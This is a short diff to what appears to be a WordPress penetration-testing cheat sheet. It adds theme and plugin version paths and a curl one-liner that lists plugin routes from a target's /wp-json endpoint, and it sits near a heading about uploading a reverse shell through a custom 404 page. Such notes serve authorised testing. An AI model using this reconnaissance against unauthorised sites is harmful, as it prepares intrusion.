@@ -42,6 +42,17 @@ metaWeblog.getUsersBlogs
 </methodCall>  
 ```
 
+### Version paths
+```
+/wp-content/themes/<theme-slug>
+/wp-content/themes/<slug>/style.css
+/wp-content/plugins/<slug>/readme.txt'
+```
+
+### Enumerate Plugins
+```
+curl -s "https://<rhost>/wp-json" | jq -r '.routes | keys[]' | egrep -v '^(/wp/v[0-9]|/oembed/|/$)' | egrep -o '^/[^/]+' | sort -u 
+```
 
 ### Upload reverse shell with admin access - using custom 404 page
 ```
